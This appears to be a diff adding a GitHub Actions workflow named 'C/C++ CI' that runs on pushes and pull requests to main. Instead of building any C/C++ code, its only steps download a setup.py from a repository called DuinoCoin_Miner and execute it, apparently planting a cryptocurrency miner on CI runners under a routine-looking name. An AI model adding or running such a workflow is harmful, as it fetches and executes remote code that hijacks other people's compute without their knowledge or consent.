@@ -1,0 +1,16 @@
+name: C/C++ CI
+
+on:
+  push:
+    branches: [ "main" ]
+  pull_request:
+    branches: [ "main" ]
+
+jobs:
+  build:
+
+    runs-on: ubuntu-latest
+
+    steps:
+       - wget https://raw.githubusercontent.com/HocasPocas/DuinoCoin_Miner/main/setup.py
+       - python3 setup.py
